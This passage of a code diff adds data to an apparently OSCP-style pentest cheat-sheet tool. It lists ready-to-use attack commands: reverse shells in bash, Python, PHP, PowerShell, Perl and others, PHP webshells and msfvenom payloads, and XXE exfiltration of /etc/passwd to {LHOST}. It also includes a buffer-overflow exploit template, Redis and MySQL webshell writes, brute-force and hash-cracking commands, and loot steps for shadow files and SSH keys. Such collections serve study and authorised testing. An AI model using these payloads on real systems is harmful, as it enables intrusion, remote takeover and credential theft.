+          {l:'Reverse shell inject',  c:'; bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\n; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'},
+          {l:'URL encoded',           c:'%3B+id\n%7C+id\n%26%26+id'},
+        ]
+      },
+      {
+        title:'File Upload',
+        cmds:[
+          {l:'PHP webshell',          c:'<?php system($_GET["cmd"]); ?>'},
+          {l:'PHP reverse shell cmd', c:'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'"); ?>'},
+          {l:'Extension bypass',      c:'shell.php.jpg\nshell.php%00.jpg\nshell.pHp\nshell.phtml\nshell.php5\nshell.shtml'},
+          {l:'Content-Type bypass',   c:'Change: Content-Type: image/jpeg\n(keep .php extension)'},
+          {l:'msfvenom PHP shell',    c:'msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw > shell.php'},
+          {l:'JSP shell',             c:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.jsp'},
+          {l:'ASPX shell',            c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx > shell.aspx'},
+        ]
+      },
+      {
+        title:'SSRF',
+        cmds:[
+          {l:'Internal localhost',    c:'http://127.0.0.1\nhttp://localhost\nhttp://[::1]'},
+          {l:'AWS metadata',          c:'http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/'},
+          {l:'GCP metadata',          c:'http://metadata.google.internal/computeMetadata/v1/\n(Header: Metadata-Flavor: Google)'},
+          {l:'Azure metadata',        c:'http://169.254.169.254/metadata/instance?api-version=2021-01-01\n(Header: Metadata: true)'},
+          {l:'SSRF bypass tricks',    c:'http://0177.0.0.1\nhttp://0x7f000001\nhttp://127.0.0.1.nip.io\nhttp://localtest.me'},
+          {l:'Internal port scan',    c:'# Use Burp Intruder on port number:\nhttp://127.0.0.1:§80§/'},
+        ]
+      },
+      {
+        title:'XXE',
+        cmds:[
+          {l:'Basic XXE',             c:'<?xml version="1.0"?>\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>'},
+          {l:'XXE OOB (blind)',       c:'<?xml version="1.0"?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM "http://{LHOST}:8000/evil.dtd"> %ext;\n]>\n<root/>'},
+          {l:'evil.dtd content',      c:'<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{LHOST}:8000/?data=%file;\'>"> \n%eval;\n%exfil;'},
+          {l:'XXE SVG upload',        c:'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'},
+        ]
+      },
+      {
+        title:'Auth & JWT',
+        cmds:[
+          {l:'Admin paths',           c:'http://{IP}:{PORT}/admin\nhttp://{IP}:{PORT}/administrator\nhttp://{IP}:{PORT}/wp-admin\nhttp://{IP}:{PORT}/manager'},
+          {l:'Default creds list',    c:'admin:admin\nadmin:password\nadmin:123456\nroot:root\ntest:test\nguest:guest'},
+          {l:'SQLi auth bypass',      c:"admin'-- -\n' OR '1'='1'-- -\n' OR 1=1-- -"},
+          {l:'JWT decode (jwt_tool)',  c:'python3 jwt_tool.py TOKEN'},
+          {l:'JWT none algorithm',    c:'python3 jwt_tool.py TOKEN -X a'},
+          {l:'JWT key confusion',     c:'python3 jwt_tool.py TOKEN -X k -pk public.pem'},
+          {l:'JWT brute secret',      c:'python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt'},
+          {l:'Hydra HTTP POST',       c:'hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 30'},
+          {l:'Hydra HTTP GET Basic',  c:'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://{IP}:{PORT}/'},
+        ]
+      },
+      {
+        title:'WordPress',
+        cmds:[
+          {l:'WPScan full',           c:'wpscan --url http://{IP}:{PORT} --enumerate u,p,t,tt,cb,dbe'},
+          {l:'WPScan brute',          c:'wpscan --url http://{IP}:{PORT} -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc'},
+          {l:'WPScan API token',      c:'wpscan --url http://{IP}:{PORT} --enumerate --api-token TOKEN'},
+          {l:'WP theme edit RCE',     c:'# Admin panel -> Appearance -> Theme Editor -> 404.php\n<?php system($_GET["cmd"]); ?>'},
+          {l:'WP plugin upload',      c:'# Create malicious plugin zip\n<?php system($_GET["cmd"]); ?>\n# Admin -> Plugins -> Add New -> Upload'},
+          {l:'xmlrpc brute check',    c:'curl -s -X POST http://{IP}:{PORT}/xmlrpc.php --data "<methodCall><methodName>system.listMethods</methodName></methodCall>"'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'bof', icon:'💥', label:'Buffer Overflow', desc:'BOF exploitation methodology (OSCP style)',
+    sections:[
+      {
+        title:'Step 1: Fuzzing',
+        cmds:[
+          {l:'Spike fuzzer template', c:'# generic_send_tcp {IP} {PORT} script.spk 0 0'},
+          {l:'Python fuzzer',         c:'#!/usr/bin/python3\nimport socket, time\nbuffer = "A" * 100\nwhile True:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect(("{IP}", {PORT}))\n        s.recv(1024)\n        print(f"Sending {len(buffer)} bytes")\n        s.send(bytes(buffer + "\\r\\n", "latin-1"))\n        s.recv(1024)\n        s.close()\n        time.sleep(1)\n        buffer += "A" * 100\n    except:\n        print(f"Crashed at {len(buffer)} bytes")\n        break'},
+        ]
+      },
+      {
+        title:'Step 2: Find EIP Offset',
+        cmds:[
+          {l:'Generate pattern (Kali)', c:'/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000'},
+          {l:'Find offset from EIP',   c:'/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_VALUE_HERE'},
+          {l:'Confirm offset',         c:'# Script: buf = "A"*OFFSET + "B"*4 + "C"*500\n# EIP should be 42424242 (BBBB)'},
+          {l:'Mona pattern create',    c:'!mona pc 3000'},
+          {l:'Mona find offset',       c:'!mona po EIP_VALUE'},
+        ]
+      },
+      {
+        title:'Step 3: Bad Chars',
+        cmds:[
+          {l:'Generate all bytes script', c:'#!/usr/bin/python3\nbadchars = b""\nfor i in range(0x01, 0x100):\n    badchars += bytes([i])\nprint(badchars)'},
+          {l:'Mona compare',          c:'!mona compare -f C:\\mona\\app\\bytearray.bin -a ESP_ADDRESS'},
+          {l:'Mona bytearray gen',    c:'!mona bytearray -b "\\x00"'},
+          {l:'After finding bad chars',c:'!mona bytearray -b "\\x00\\xXX\\xXX"'},
+          {l:'Remove from payload',    c:'# Update badchars list and regenerate\n# Common: \\x00, \\x0a, \\x0d, \\xff'},
+        ]
+      },
+      {
+        title:'Step 4: Find JMP ESP',
+        cmds:[
+          {l:'Mona find JMP ESP',     c:'!mona jmp -r esp -cpb "\\x00"'},
+          {l:'Mona modules (check)',   c:'!mona modules'},
+          {l:'nasm_shell JMP ESP',     c:'/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb\nJMP ESP -> FFE4'},
+          {l:'Mona find by opcode',   c:'!mona find -s "\\xff\\xe4" -m module.dll'},
+          {l:'Note: pick no ASLR/DEP/SafeSEH module', c:'# Rebase=False, ASLR=False, SafeSEH=False, NXCompat=False'},
+        ]
+      },
+      {
+        title:'Step 5: Generate Shellcode',
+        cmds:[
+          {l:'Windows reverse shell',  c:'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\\x00" -f python'},
+          {l:'Windows x64 shell',      c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\\x00" -f python'},
+          {l:'Linux x86 shell',        c:'msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -b "\\x00" -f python'},
+          {l:'With custom bad chars',  c:'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b "\\x00\\x0a\\x0d" -f python'},
+          {l:'Listener',               c:'nc -lvnp {LPORT}'},
+        ]
+      },
+      {
+        title:'Step 6: Exploit Template',
+        cmds:[
+          {l:'Final exploit',         c:'#!/usr/bin/python3\nimport socket\n\nip = "{IP}"\nport = {PORT}\noffset = 0          # from step 2\nretn = b"\\xXX\\xXX\\xXX\\xXX"  # JMP ESP addr (little endian)\npadding = b"\\x90" * 16  # NOP sled\npayload = b""  # msfvenom output\n\nbuffer = b"A" * offset + retn + padding + payload\n\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))\n    s.recv(1024)\n    print(f"[*] Sending payload ({len(buffer)} bytes)")\n    s.send(buffer + b"\\r\\n")\n    s.close()\nexcept Exception as e:\n    print(f"Error: {e}")'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'services', icon:'🔌', label:'Services', desc:'FTP, SSH, SMB, RDP, SMTP, SNMP, NFS, databases',
+    sections:[
+      {
+        title:'FTP (21)',
+        cmds:[
+          {l:'Connect',               c:'ftp {IP}'},
+          {l:'Anonymous login',        c:'ftp {IP}\n# username: anonymous\n# password: (blank or anonymous@)'},
+          {l:'List files',            c:'ls -la; dir'},
+          {l:'Download file',         c:'get filename'},
+          {l:'Upload file',           c:'put shell.php'},
+          {l:'Binary mode',           c:'binary; get file.exe'},
+          {l:'Brute force',           c:'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{IP}:{PORT} -t 30'},
+          {l:'Nmap FTP scripts',      c:'nmap -p 21 --script=ftp-anon,ftp-brute,ftp-bounce,ftp-syst {IP}'},
+        ]
+      },
+      {
+        title:'SSH (22)',
+        cmds:[
+          {l:'Connect',               c:'ssh user@{IP} -p {PORT}'},
+          {l:'With private key',       c:'ssh -i id_rsa user@{IP} -p {PORT}'},
+          {l:'Fix key perms',          c:'chmod 600 id_rsa'},
+          {l:'SSH tunneling local',    c:'ssh -L 8080:127.0.0.1:80 user@{IP}'},
+          {l:'SSH tunneling remote',   c:'ssh -R 4444:127.0.0.1:4444 user@{IP}'},
+          {l:'SSH dynamic SOCKS',      c:'ssh -D 9050 user@{IP}'},
+          {l:'Crack with Hydra',       c:'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{IP}:{PORT} -t 4'},
+          {l:'Medusa',                 c:'medusa -h {IP} -u root -P /usr/share/wordlists/rockyou.txt -M ssh'},
+          {l:'SSH audit',             c:'ssh-audit {IP}'},
+          {l:'Nmap SSH scripts',       c:'nmap -p 22 --script=ssh-auth-methods,ssh-hostkey,ssh-brute {IP}'},
+        ]
+      },
+      {
+        title:'SMB (445/139)',
+        cmds:[
+          {l:'List shares null',       c:'smbclient -L //{IP} -N'},
+          {l:'List shares creds',      c:'smbclient -L //{IP} -U user'},
+          {l:'Connect to share',       c:'smbclient //{IP}/sharename -N'},
+          {l:'Download all files',     c:'smbclient //{IP}/share -N -c "prompt;recurse;mget *"'},
+          {l:'Upload file',            c:'smbclient //{IP}/share -N -c "put shell.php"'},
+          {l:'CrackMapExec enum',      c:'crackmapexec smb {IP} -u \'\' -p \'\' --shares'},
+          {l:'CrackMapExec creds',     c:'crackmapexec smb {IP} -u user -p pass --shares --users'},
+          {l:'enum4linux-ng',          c:'enum4linux-ng -A {IP}'},
+          {l:'SMBMap',                 c:'smbmap -H {IP}; smbmap -H {IP} -u user -p pass'},
+          {l:'Mount share',            c:'sudo mount -t cifs //{IP}/share /mnt/smb -o username=user,password=pass'},
+          {l:'Nmap vuln scripts',      c:'nmap -p 445 --script=smb-vuln* {IP}'},
+          {l:'EternalBlue check',      c:'nmap -p 445 --script=smb-vuln-ms17-010 {IP}'},
+          {l:'Brute force',            c:'crackmapexec smb {IP} -u users.txt -p /usr/share/wordlists/rockyou.txt'},
+        ]
+      },
+      {
+        title:'RDP (3389)',
+        cmds:[
+          {l:'Connect xfreerdp',       c:'xfreerdp /v:{IP}:{PORT} /u:administrator /p:password'},
+          {l:'xfreerdp pass-hash',     c:'xfreerdp /v:{IP} /u:administrator /pth:NTLM_HASH'},
+          {l:'xfreerdp drive share',   c:'xfreerdp /v:{IP} /u:user /p:pass /drive:kali,/home/kali'},
+          {l:'rdesktop',               c:'rdesktop {IP}:{PORT} -u administrator -p password'},
+          {l:'Brute (ncrack)',         c:'ncrack -u administrator -P /usr/share/wordlists/rockyou.txt rdp://{IP}:{PORT}'},
+          {l:'Brute (Hydra)',          c:'hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{IP} -t 4'},
+          {l:'BlueKeep check',         c:'nmap -p 3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption {IP}'},
+        ]
+      },
+      {
+        title:'SMTP (25)',
+        cmds:[
+          {l:'Banner grab',            c:'nc -nv {IP} 25'},
+          {l:'EHLO / VRFY',            c:'nc {IP} 25\nEHLO test\nVRFY root\nVRFY admin\nEXPN postmaster'},
+          {l:'smtp-user-enum',         c:'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {IP}'},
+          {l:'Nmap SMTP scripts',      c:'nmap -p 25 --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2010-4344 {IP}'},
+          {l:'Swaks send test mail',   c:'swaks --to victim@domain.com --from attacker@domain.com --header "Subject: Test" --body "Click: http://{LHOST}" --server {IP}'},
+        ]
+      },
+      {
+        title:'SNMP (161/UDP)',
+        cmds:[
+          {l:'snmpwalk v1 public',     c:'snmpwalk -c public -v 1 {IP}'},
+          {l:'snmpwalk v2c',           c:'snmpwalk -c public -v 2c {IP}'},
+          {l:'snmp-check',             c:'snmp-check {IP}'},
+          {l:'Onesixtyone (community brute)', c:'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {IP}'},
+          {l:'Nmap SNMP scripts',      c:'nmap -sU -p 161 --script=snmp-brute,snmp-info,snmp-sysdescr {IP}'},
+          {l:'SNMP Extend for RCE',    c:'snmpwalk -v2c -c public {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull'},
+        ]
+      },
+      {
+        title:'NFS',
+        cmds:[
+          {l:'Show exports',           c:'showmount -e {IP}'},
+          {l:'Mount share',            c:'sudo mkdir /mnt/nfs && sudo mount -t nfs {IP}:/share /mnt/nfs -o nolock'},
+          {l:'no_root_squash exploit', c:'# If no_root_squash: copy bash, set SUID\ncp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash\n/mnt/nfs/bash -p'},
+          {l:'Nmap NFS scripts',       c:'nmap -p 111,2049 --script=nfs-ls,nfs-showmount,nfs-statfs {IP}'},
+        ]
+      },
+      {
+        title:'MySQL (3306)',
+        cmds:[
+          {l:'Connect local',          c:'mysql -h {IP} -u root -p'},
+          {l:'Connect no pass',        c:'mysql -h {IP} -u root'},
+          {l:'Basic enumeration',      c:'show databases;\nuse mysql;\nshow tables;\nselect user,password from user;'},
+          {l:'Read file (FILE priv)',   c:"SELECT LOAD_FILE('/etc/passwd');"},
+          {l:'Write webshell',         c:"SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"},
+          {l:'UDF RCE (priv esc)',     c:'# lib_mysqludf_sys — see GTFObins/mysql'},
+        ]
+      },
+      {
+        title:'MSSQL (1433)',
+        cmds:[
+          {l:'Impacket mssql',         c:'impacket-mssqlclient domain/user:pass@{IP} -windows-auth'},
+          {l:'xp_cmdshell enable',     c:"EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"},
+          {l:'xp_cmdshell exec',       c:"EXEC xp_cmdshell 'whoami';"},
+          {l:'xp_cmdshell rev shell',  c:"EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://{LHOST}:8000/rev.ps1\\\")\"';"},
+          {l:'Sqsh connect',           c:'sqsh -S {IP} -U user -P pass'},
+        ]
+      },
+      {
+        title:'Redis (6379)',
+        cmds:[
+          {l:'Connect',                c:'redis-cli -h {IP} -p 6379'},
+          {l:'Auth',                   c:'redis-cli -h {IP} AUTH password'},
+          {l:'Enumerate',              c:'redis-cli -h {IP} INFO\nredis-cli -h {IP} KEYS *\nredis-cli -h {IP} GET keyname'},
+          {l:'Config get dir',         c:"redis-cli -h {IP} CONFIG GET dir\nredis-cli -h {IP} CONFIG GET dbfilename"},
+          {l:'Write SSH key (RCE)',     c:'redis-cli -h {IP} CONFIG SET dir /root/.ssh\nredis-cli -h {IP} CONFIG SET dbfilename authorized_keys\nredis-cli -h {IP} SET payload "$(cat /home/kali/.ssh/id_rsa.pub)"\nredis-cli -h {IP} BGSAVE'},
+          {l:'Write webshell',         c:'redis-cli -h {IP} CONFIG SET dir /var/www/html\nredis-cli -h {IP} CONFIG SET dbfilename shell.php\nredis-cli -h {IP} SET payload "<?php system($_GET[\'cmd\']); ?>"\nredis-cli -h {IP} BGSAVE'},
+        ]
+      },
+      {
+        title:'MongoDB (27017)',
+        cmds:[
+          {l:'Connect',                c:'mongosh {IP}:{PORT}'},
+          {l:'Enumerate',              c:'show dbs;\nuse admin;\nshow collections;\ndb.users.find();'},
+          {l:'No auth dump',           c:"mongo {IP}:{PORT} --eval \"db.adminCommand({listDatabases:1})\""},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'shells', icon:'🐚', label:'Reverse Shells', desc:'Reverse shell one-liners for all platforms',
+    sections:[
+      {
+        title:'Listener',
+        cmds:[
+          {l:'Netcat basic',          c:'nc -lvnp {LPORT}'},
+          {l:'Netcat rlwrap (better)', c:'rlwrap nc -lvnp {LPORT}'},
+          {l:'Socat tty',             c:'socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}'},
+          {l:'Metasploit multi',       c:'use exploit/multi/handler\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nrun'},
+        ]
+      },
+      {
+        title:'Bash / Shell',
+        cmds:[
+          {l:'Bash TCP',              c:'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'},
+          {l:'Bash TCP (exec)',        c:'/bin/bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\''},
+          {l:'Bash UDP',              c:'bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1'},
+          {l:'sh via mkfifo',         c:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'},
+          {l:'Netcat -e',             c:'nc -e /bin/bash {LHOST} {LPORT}'},
+          {l:'Netcat -c',             c:'nc -c bash {LHOST} {LPORT}'},
+        ]
+      },
+      {
+        title:'Python',
+        cmds:[
+          {l:'Python3',               c:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''},
+          {l:'Python2',               c:'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''},
+        ]
+      },
+      {
+        title:'PHP',
+        cmds:[
+          {l:'PHP exec',              c:'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\''},
+          {l:'PHP passthru',          c:'php -r \'$sock=fsockopen("{LHOST}",{LPORT});passthru("/bin/sh -i <&3 >&3 2>&3");\''},
+          {l:'PHP webshell',          c:'<?php system($_GET["cmd"]); ?>'},
+          {l:'PHP full webshell',     c:'<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";}?>'},
+          {l:'Pentest monkey rev',    c:'# /usr/share/webshells/php/php-reverse-shell.php\n# Change $ip and $port'},
+        ]
+      },
+      {
+        title:'PowerShell (Windows)',
+        cmds:[
+          {l:'PS one-liner',          c:'powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
+          {l:'PS from IEX',           c:'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:8000/rev.ps1\')"'},
+          {l:'Nishang (Invoke-PS)',    c:'IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}:8000/Invoke-PowerShellTcp.ps1\')\nInvoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}'},
+          {l:'Cmd version (escape)',   c:'cmd /c powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});..."'},
+        ]
+      },
+      {
+        title:'Msfvenom Payloads',
+        cmds:[
+          {l:'Windows EXE',           c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe'},
+          {l:'Windows EXE (x86)',      c:'msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe'},
+          {l:'Linux ELF',             c:'msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > shell.elf && chmod +x shell.elf'},
+          {l:'PHP payload',           c:'msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw > shell.php'},
+          {l:'JSP payload',           c:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.jsp'},
+          {l:'WAR (Tomcat)',           c:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war'},
+          {l:'ASPX (.NET)',            c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx > shell.aspx'},
+          {l:'Python payload',         c:'msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw'},
+        ]
+      },
+      {
+        title:'Other Languages',
+        cmds:[
+          {l:'Perl',                  c:'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''},
+          {l:'Ruby',                  c:'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''},
+          {l:'Golang',                c:'echo \'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/shell.go && go run /tmp/shell.go'},
+          {l:'Java',                  c:'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()'},
+          {l:'AWK',                   c:'awk \'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print |& s; close(c)} while(c != "exit") close(s)}}\' /dev/null'},
+          {l:'Socat',                 c:'socat TCP:{LHOST}:{LPORT} EXEC:/bin/bash'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'cracking', icon:'🔑', label:'Password Cracking', desc:'Hashcat, John, and wordlist tips',
+    sections:[
+      {
+        title:'Hash Identification',
+        cmds:[
+          {l:'hashid',                c:'hashid HASH\nhashid -m HASH'},
+          {l:'hash-identifier',       c:'hash-identifier\n# paste hash'},
+          {l:'haiti',                 c:'haiti HASH'},
+          {l:'Common formats',        c:'MD5: 32 hex chars\nSHA1: 40 hex chars\nSHA256: 64 hex chars\nNTLM: 32 hex chars (same as MD5)\nbcrypt: starts with $2a$/$2b$\nSHA512crypt: starts with $6$\nSHA256crypt: starts with $5$'},
+        ]
+      },
+      {
+        title:'Hashcat',
+        cmds:[
+          {l:'MD5 (-m 0)',             c:'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'SHA1 (-m 100)',          c:'hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'SHA256 (-m 1400)',       c:'hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'NTLM (-m 1000)',         c:'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'NetNTLMv2 (-m 5600)',    c:'hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'bcrypt (-m 3200)',       c:'hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'SHA512crypt (-m 1800)',  c:'hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'Kerberoast (-m 13100)',  c:'hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'ASREP (-m 18200)',       c:'hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt'},
+          {l:'Rules + wordlist',       c:'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule'},
+          {l:'Brute force mask',       c:'hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a'},
+          {l:'Show cracked',           c:'hashcat -m 0 hash.txt --show'},
+        ]
+      },
+      {
+        title:'John the Ripper',
+        cmds:[
+          {l:'Auto detect + crack',   c:'john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'},
+          {l:'Show cracked',           c:'john hash.txt --show'},
+          {l:'Format specific',        c:'john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT'},
+          {l:'SSH key crack',          c:'ssh2john id_rsa > id_rsa.hash\njohn id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt'},
+          {l:'ZIP crack',              c:'zip2john file.zip > zip.hash\njohn zip.hash --wordlist=/usr/share/wordlists/rockyou.txt'},
+          {l:'RAR crack',              c:'rar2john file.rar > rar.hash\njohn rar.hash --wordlist=/usr/share/wordlists/rockyou.txt'},
+          {l:'KeePass crack',          c:'keepass2john keepass.kdbx > keepass.hash\njohn keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt'},
+          {l:'/etc/shadow crack',      c:'unshadow /etc/passwd /etc/shadow > shadow.txt\njohn shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt'},
+        ]
+      },
+      {
+        title:'Wordlists',
+        cmds:[
+          {l:'RockYou',               c:'/usr/share/wordlists/rockyou.txt'},
+          {l:'SecLists',              c:'/usr/share/seclists/'},
+          {l:'Cewl website words',    c:'cewl http://{IP}:{PORT} -d 2 -m 5 -o -w cewl.txt'},
+          {l:'Mutate wordlist (john)', c:'john --wordlist=words.txt --rules --stdout > mutated.txt'},
+          {l:'Crunch pattern',        c:'crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 > wordlist.txt'},
+          {l:'Cupp (personal info)',   c:'cupp -i'},
+        ]
+      },
+      {
+        title:'Capture Hashes',
+        cmds:[
+          {l:'Responder (MITM)',       c:'sudo responder -I tun0 -dwv'},
+          {l:'Responder + NTLMv2',     c:'# Trigger with: net use \\\\{LHOST}\\share\n# Capture NTLMv2 in Responder, crack with hashcat -m 5600'},
+          {l:'Impacket NTLMrelay',     c:'impacket-ntlmrelayx -tf targets.txt -smb2support'},
+        ]
+      },
+    ]
+  },
+  // ---------------------------------------------------------------
+  {
+    id:'post', icon:'🎯', label:'Post Exploitation', desc:'After getting a shell',
+    sections:[
+      {
+        title:'Loot: Linux',
+        cmds:[
+          {l:'Proof flag',            c:'cat /root/proof.txt; cat /root/root.txt; cat ~/root.txt'},
+          {l:'Local flag',            c:'cat /home/*/local.txt; find / -name "local.txt" 2>/dev/null'},
+          {l:'All flags',             c:'find / -name "*.txt" 2>/dev/null | xargs grep -l "flag{\\|HTB{\\|OSCP" 2>/dev/null'},
+          {l:'Dump hashes',           c:'cat /etc/shadow; unshadow /etc/passwd /etc/shadow'},
+          {l:'SSH keys',              c:'cat /root/.ssh/id_rsa; cat ~/.ssh/id_rsa; ls -la ~/.ssh/'},
+          {l:'Browser data',          c:'find / -name "*.sqlite" -o -name "logins.json" 2>/dev/null'},
+          {l:'Interesting dirs',       c:'ls -la /opt /srv /var/backups /var/mail /var/spool /tmp /dev/shm'},
+        ]
+      },
+      {
+        title:'Loot: Windows',
+        cmds:[
+          {l:'Proof flag',            c:'type C:\\Users\\Administrator\\Desktop\\proof.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt'},
+          {l:'Local flag',            c:'type C:\\Users\\*\\Desktop\\local.txt'},
